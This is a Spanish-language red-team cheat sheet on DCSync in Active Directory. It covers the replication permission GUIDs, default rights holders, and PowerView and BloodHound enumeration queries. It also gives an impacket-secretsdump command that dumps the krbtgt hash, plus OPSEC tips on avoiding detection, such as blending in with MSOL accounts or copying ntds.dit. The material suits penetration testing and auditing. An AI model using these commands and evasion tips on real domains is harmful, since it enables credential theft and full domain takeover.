---
aliases:
  - DCSync ACEs
  - Replication Rights
  - GetChangesAll
tags:
  - type/technique
  - technique/credential-access
  - env/windows
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[DCSync]]'
---
# DCSync - Permisos y Discovery

***

## ACEs requeridos

| **ACE (Extended Right)** | **GUID** | **Para qué** |
|:---:|:---:|:---:|
| `DS-Replication-Get-Changes` | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | Replicación básica (objetos sin secretos) |
| `DS-Replication-Get-Changes-All` | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | **Requerido** — incluye atributos sensibles (hashes, keys) |
| `DS-Replication-Get-Changes-In-Filtered-Set` | `89e95b76-444d-4c62-991a-0facbeda640c` | RODC filtered attribute sets (opcional) |
^dcsync-perms-aces

**Necesitás ambos primeros GUIDs** sobre el naming context del dominio (`DC=corp,DC=local`).

___

## Holders por defecto

| **Principal** | **Tipo** | **Cuándo** |
|:---:|:---:|:---:|
| `Domain Admins` | Grupo | Default |
| `Enterprise Admins` | Grupo | Default |
| `Administrators` (built-in) | Grupo | Default |
| `Domain Controllers` | Grupo de computer accounts | Default — DCs necesitan replicar |
| `MSOL_*` account | Service account | Azure AD Connect (AAD sync) |
| `Exchange` service accounts | Service accounts | Exchange pre-split permissions |
| Cuentas custom delegadas | Usuario | Backup/monitoring delegados |
^dcsync-perms-defaults

**Red flag:** `MSOL_*` accounts con DCSync generan muchos falsos positivos en MDI — usadas por Azure AD Connect legítimamente.

___

## Enumerar con PowerView

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs \| ? ObjectAceType -match "Replication"` | Cuentas con DCSync rights | Discovery manual. |
| `Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs \| ? RightsFilter -match "DCSync"` | Idem PowerView moderno | Discovery. |
| `Get-ObjectAcl ... \| Select IdentityReference, ObjectAceType` | Output limpio | Post-discovery. |
^dcsync-perms-powerview

```powershell
# PowerView — quién tiene DCSync
Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs |
  Where-Object {$_.ObjectAceType -match "DS-Replication-Get-Changes"} |
  Select-Object IdentityReference, ObjectAceType |
  Sort-Object IdentityReference
```

___

## Enumerar con BloodHound / Cypher

| **Query** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH p=(n)-[:DCSync\|GetChanges\|GetChangesAll]->(d:Domain) RETURN p` | Paths con DCSync edges | Discovery BloodHound. |
| `MATCH p=(n {owned:true})-[:DCSync\|GetChanges\|GetChangesAll]->(d:Domain) RETURN p` | Paths desde owned nodes | Post-compromise. |
| `MATCH (n)-[:MemberOf*1..]->(g)-[:DCSync]->(d:Domain) RETURN n,g,d` | Indirecto via group | Nested memberships. |
^dcsync-perms-bloodhound

___

## Enumerar con impacket (test rápido)

| **Comando** | **Qué indica** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-secretsdump corp/user:pass@DC -just-dc-user krbtgt` | Sin error = tenés DCSync | Prueba directa. |
| Error `DRSUAPI SessionError: code: 0x20f7` | Sin permisos de replicación | No tenés DCSync. |
^dcsync-perms-test

```bash
# Test rápido — si devuelve hash, tenés DCSync
impacket-secretsdump corp.local/svcuser:'P@ss'@dc01.corp.local -just-dc-user krbtgt
```

___

## OPSEC — consideraciones pre-ataque

| **Factor** | **Detalle** | **Impacto** |
|:---:|:---:|:---:|
| DCSync genera Event 4662 en el DC | Cada request de replicación logueado | Inevitable con DRSUAPI method |
| MDI detecta origen no-DC | Source IP que no es DC → alert inmediato | Imposible evadir si MDI activo |
| Solicitar solo krbtgt + admin < full dump | Menos ruido que sync completo | Prefer targeted requests |
| `MSOL_*` accounts como cover | Mismo usuario para blend — difícil | Necesitás comprometer esa cuenta |
| Alternativa file-based en DC | VSS + ntds.dit copy — no genera 4662 DCSync | Si tenés RCE en DC |
^dcsync-perms-opsec

***
